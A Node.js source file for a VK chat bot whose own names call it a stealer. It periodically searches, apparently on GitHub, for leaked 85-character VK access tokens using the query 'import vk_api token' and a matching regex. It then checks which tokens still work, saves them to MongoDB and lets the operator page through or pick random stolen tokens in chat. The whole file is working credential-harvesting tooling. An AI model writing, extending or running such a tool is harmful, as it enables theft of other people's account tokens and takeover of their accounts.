const { VK, Keyboard } = require('vk-io');
const { HearManager } = require('@vk-io/hear');
const MongoClient = require("mongodb").MongoClient;

const { db_get_collection, db_get_random, db_add, db_delete_collection } = require("./db.js")
const { get_vk_messages } = require('./vk_handler.js')
const { vk_checker } = require("./vk_checker.js");
const { get_tokens } = require("./stealer.js");

const client = new MongoClient(
    "mongodb://localhost:27017/",
    { useUnifiedTopology: true },
);

const vk = new VK({
    token: process.env.vktoken
});

const hearManager = new HearManager();

vk.updates.on('message_new', (context, next) => {
	const { messagePayload } = context;

    if (messagePayload && messagePayload.command) {
        context.state.command = messagePayload.command
    } else if (context.text) {
        context.state.command = context.text
    } else {
        context.state.command = "undefined command"
    }

    return next();
});

vk.updates.on('message_new', hearManager.middleware);

const hearCommand = (name, handle) => {
	hearManager.hear(
		[
			(text, { state }) => (
                state.command.match(name)
			),
			name
		],
		handle
	);
};

function unique(arr) {
    return Array.from(new Set(arr));
}

client.connect(async function(err, client) {
    const db = client.db("stealer")
    const checks_collection = db.collection("checks");
    
    hearCommand(/гитхаб все/i, async (context) => {
    
        let current_offset = context.messagePayload && context.messagePayload.offset
        ? context.messagePayload.offset
        : 0
        
        let checks = await db_get_collection(checks_collection, current_offset, 3);
        if (checks !== undefined && Object.keys(checks).length > 0) {
            let message_text = await get_vk_messages(checks)
            context.send({
                message: message_text.join("\n"),
                keyboard: Keyboard.builder()
                    .textButton({
                    label: '⬅',
                        payload: {
                            command: 'гитхаб все',
                            offset: current_offset-3
                        }
                    })
                    .textButton({
                        label: '➡',
                        payload: {
                            command: 'гитхаб все',
                            offset: current_offset+3
                        }
                    })
                    .row()
                    .inline()
            })
        } else {
            context.send({
                message: "Нет данных"
            })
        }
    });

    hearCommand(/гитхаб рандом/i, async (context) => {
        let check = await db_get_random(checks_collection)
        let text1 = await get_vk_messages(check)
        context.send({
            message: text1,
        })
    })

    async function dbupdate() {
        while (true) {
            
            let new_tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
            let db_checks = await db_get_collection(checks_collection);
            let db_tokens = await Promise.all(db_checks.map(check => check.token)); //чеки в токены
            let all_tokens = unique(db_tokens.concat(new_tokens));
            let all_checks = await vk_checker(all_tokens);

            db_delete_collection(checks_collection)
            db_add(checks_collection, all_checks)

            console.log("updated db")
            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
        };
    };

    dbupdate();
    vk.updates.start().catch(console.error);
});